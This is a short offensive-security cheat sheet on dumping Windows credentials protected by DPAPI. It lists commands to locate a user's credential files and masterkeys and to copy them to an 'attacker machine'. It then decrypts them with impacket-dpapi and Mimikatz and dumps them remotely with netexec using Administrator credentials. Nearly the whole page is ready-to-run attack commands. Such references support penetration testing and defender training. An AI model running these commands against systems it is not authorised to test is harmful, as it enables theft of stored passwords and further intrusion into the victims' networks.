---
description: Credentials Dumping from Data Protection API
---

# DPAPI

## From Low Users

### Manual Approach

Locating credential files:

{% code overflow="wrap" %}
```powershell
dir /A C:\Users\yuyudhn\AppData\Local\Microsoft\Credentials\
dir /A C:\Users\yuyudhn\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Force C:\Users\yuyudhn\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Force C:\Users\yuyudhn\AppData\Roaming\Microsoft\Credentials\
```
{% endcode %}

Locating masterkeys:

```powershell
dir /A C:\Users\yuyudhn\AppData\Roaming\Microsoft\Protect\
dir /A C:\Users\yuyudhn\AppData\Local\Microsoft\Protect\
Get-ChildItem -Force C:\Users\yuyudhn\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Force C:\Users\yuyudhn\AppData\Local\Microsoft\Protect\
```

Usually, the structure is like this:

{% code overflow="wrap" %}
```
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```
{% endcode %}

Download all credential files and masterkeys to attacker machine. And then extract the credentials using impacket-dpapi.

Decrypt masterkey

{% code overflow="wrap" %}
```bash
impacket-dpapi masterkey -file $masterkey -sid $SID -password Password1213!
```
{% endcode %}

Or if you have the backup key:

```bash
impacket-dpapi masterkey -file $masterkey -sid $SID -pvk key.pvk
```

Grab credentials:

{% code overflow="wrap" %}
```bash
impacket-dpapi credential -file $credsfile -key $decryptedkey
```
{% endcode %}

### Mimikatz

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"dpapi::masterkey /in:C:\Users\yuyudhn\AppData\Roaming\Microsoft\Protect\$SID\$GID /sid:$SID /password:Password1337 /protected" "exit"'
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"dpapi::cred /in:C:\Users\yuyudhn\AppData\Roaming\Microsoft\Credentials\$credsfile /masterkey:$decryptedkey"'
```
{% endcode %}

## From Administrator

{% code overflow="wrap" %}
```bash
netexec smb target.local -u Administrator -p Password123 --local-auth --dpapi
```
{% endcode %}
